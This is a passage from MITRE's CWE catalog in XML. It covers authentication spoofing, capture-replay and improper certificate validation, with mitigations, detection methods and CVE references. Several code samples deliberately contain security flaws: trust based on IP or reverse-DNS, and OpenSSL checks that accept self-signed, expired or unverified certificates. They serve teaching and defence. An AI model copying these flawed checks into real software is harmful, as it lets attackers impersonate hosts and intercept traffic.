                           <xhtml:br/>if (isTrustedAddress(clientIPAddress) &amp; secretKey.equals(in)) {<xhtml:div style="margin-left:1em;">out = secret.getBytes();<xhtml:br/>DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp);</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code only verifies the address as stored in the request packet. An attacker can spoof this address, thus impersonating a trusted client.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-93">
               <Intro_Text>The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>struct hostent *hp;struct in_addr myaddr;<xhtml:br/>char* tHost = "trustme.example.com";<xhtml:br/>myaddr.s_addr=inet_addr(ip_addr_string);<xhtml:br/>
                     <xhtml:br/>hp = gethostbyaddr((char *) &amp;myaddr, sizeof(struct in_addr), AF_INET);<xhtml:br/>if (hp &amp;&amp; !strncmp(hp-&gt;h_name, tHost, sizeof(tHost))) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>} else {<xhtml:div style="margin-left:1em;">trusted = false;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String ip = request.getRemoteAddr();<xhtml:br/>InetAddress addr = InetAddress.getByName(ip);<xhtml:br/>if (addr.getCanonicalHostName().endsWith("trustme.com")) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);<xhtml:br/>IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);<xhtml:br/>if (hostInfo.HostName.EndsWith("trustme.com")) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-1048</Reference>
               <Description>VOIP product allows authentication bypass using 127.0.0.1 in the Host header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1048</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication bypass by spoofing</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="459"/>
            <Related_Attack_Pattern CAPEC_ID="461"/>
            <Related_Attack_Pattern CAPEC_ID="473"/>
            <Related_Attack_Pattern CAPEC_ID="476"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="667"/>
            <Related_Attack_Pattern CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Spoofing and Identification&#34;, Page 72"/>
         </References>
         <Notes>
            <Note Type="Relationship">This can be resultant from insufficient verification.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="294" Name="Authentication Bypass by Capture-replay" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>A capture-replay flaw exists when the design of the product makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes).</Description>
         <Extended_Description>Capture-replay attacks are common and can be difficult to defeat without cryptography. They are a subset of network injection attacks that rely on observing previously-sent valid commands, then changing them slightly if necessary and resending the same commands to the server.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Messages sent with a capture-relay attack allow access to resources which are not otherwise accessible without proper authentication.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Utilize some sequence or time stamping functionality along with a checksum which takes this into account in order to ensure that messages can be parsed only once.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Since any attacker who can listen to traffic can see sequence numbers, it is necessary to sign messages with some kind of cryptography to ensure that sequence numbers are not simply doctored along with content.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-3435</Reference>
               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3435</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4961</Reference>
               <Description>Chain: cleartext transmission of the MD5 hash of password (CWE-319) enables attacks against a server that is susceptible to replay (CWE-294).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4961</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication bypass by replay</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Capture-replay</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
            <Related_Attack_Pattern CAPEC_ID="509"/>
            <Related_Attack_Pattern CAPEC_ID="555"/>
            <Related_Attack_Pattern CAPEC_ID="561"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="644"/>
            <Related_Attack_Pattern CAPEC_ID="645"/>
            <Related_Attack_Pattern CAPEC_ID="652"/>
            <Related_Attack_Pattern CAPEC_ID="701"/>
            <Related_Attack_Pattern CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="295" Name="Improper Certificate Validation" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not validate, or incorrectly validates, a certificate.</Description>
         <Extended_Description>When a certificate is invalid or malicious, it might allow an attacker to spoof a trusted entity by interfering in the communication path between the host and client. The product might connect to a malicious host while believing it is a trusted host, or the product might be deceived into accepting spoofed data that appears to originate from a trusted host.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="322" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>A certificate is a token that associates an identity (principal) to a cryptographic key. Certificates can be used to check if a public key belongs to the assumed owner.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>When the product uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Authentication</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Certificates should be carefully managed and checked to assure that data are encrypted with the intended owner's public key.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-121">
               <Intro_Text>This code checks the certificate of a connected peer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if ((cert = SSL_get_peer_certificate(ssl)) &amp;&amp; host)<xhtml:div style="margin-left:1em;">foo=SSL_get_verify_result(ssl);</xhtml:div>
                     <xhtml:br/>if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo))<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// certificate looks good, host can be trusted</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>In this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or using an Adversary-in-the-Middle (AITM) attack to modify the traffic from server to client.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-122">
               <Intro_Text>The following OpenSSL code obtains a certificate and verifies it.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>cert = SSL_get_peer_certificate(ssl);<xhtml:br/>if (cert &amp;&amp; (SSL_get_verify_result(ssl)==X509_V_OK)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// do secret things</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Even though the "verify" step returns X509_V_OK, this step does not include checking the Common Name against the name of the host. That is, there is no guarantee that the certificate is for the desired host. The SSL connection could have been established with a malicious host that provided a valid certificate.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-123">
               <Intro_Text>The following OpenSSL code ensures that there is a certificate and allows the use of expired certificates.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if (cert = SSL_get_peer(certificate(ssl)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>foo=SSL_get_verify_result(ssl);<xhtml:br/>if ((X509_V_OK==foo) || (X509_V_ERR_CERT_HAS_EXPIRED==foo))<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>//do stuff</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>If the call to SSL_get_verify_result() returns X509_V_ERR_CERT_HAS_EXPIRED, this means that the certificate has expired. As time goes on, there is an increasing chance for attackers to compromise the certificate.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-124">
               <Intro_Text>The following OpenSSL code ensures that there is a certificate before continuing execution.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if (cert = SSL_get_peer_certificate(ssl)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// got a certificate, do secret things</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Because this code does not use SSL_get_verify_results() to check the certificate, it could accept certificates that have been revoked (X509_V_ERR_CERT_REVOKED). The software could be communicating with a malicious host.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-125">
               <Intro_Text>The following OpenSSL code ensures that the host has a certificate.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if (cert = SSL_get_peer_certificate(ssl)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// got certificate, host can be trusted</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>//foo=SSL_get_verify_result(ssl);</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>//if (X509_V_OK==foo) ...</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-12496</Reference>
               <Description>A Go framework for robotics, drones, and IoT devices skips verification of root CA certificates by default.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-12496</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-1266</Reference>
               <Description>chain: incorrect "goto" in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple "goto fail" bug). CWE-705 (Incorrect Control Flow Scoping) -&gt; CWE-561 (Dead Code) -&gt; CWE-295 (Improper Certificate Validation) -&gt; CWE-393 (Return of Wrong Status Code) -&gt; CWE-300 (Channel Accessible by Non-Endpoint).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-1266</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22909</Reference>
               <Description>Chain: router's firmware update procedure uses curl with "-k" (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22909</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4989</Reference>
               <Description>Verification function trusts certificate chains in which the last certificate is self-signed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4989</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5821</Reference>
               <Description>Web browser uses a TLS-related function incorrectly, preventing it from verifying that a server's certificate is signed by a trusted certification authority (CA)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5821</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3046</Reference>
               <Description>Web browser does not check if any intermediate certificates are revoked.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3046</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-0199</Reference>
               <Description>Operating system does not check Certificate Revocation List (CRL) in some cases, allowing spoofing using a revoked certificate.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-0199</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5810</Reference>
               <Description>Mobile banking application does not verify hostname, leading to financial loss.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5810</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3446</Reference>
               <Description>Cloud-support library written in Python uses incorrect regular expression when matching hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-3446</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2408</Reference>
               <Description>Web browser does not correctly handle '\0' character (NUL) in Common Name, allowing spoofing of https sites.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2408</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-2993</Reference>
               <Description>Smartphone device does not verify hostname, allowing spoofing of mail services.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-2993</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5822</Reference>
               <Description>Application uses third-party library that does not validate hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5822</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5819</Reference>
               <Description>Cloud storage management application does not validate hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5819</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5817</Reference>
               <Description>Java library uses JSSE SSLSocket and SSLEngine classes, which do not verify the hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5817</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1378</Reference>
               <Description>chain: incorrect calculation allows attackers to bypass certificate checks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1378</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3170</Reference>
               <Description>LDAP client accepts certificates even if they are not from a trusted CA.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3170</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0265</Reference>
               <Description>chain: DNS server does not correctly check return value from the OpenSSL EVP_VerifyFinal function allows bypass of validation of the certificate chain.</Description>
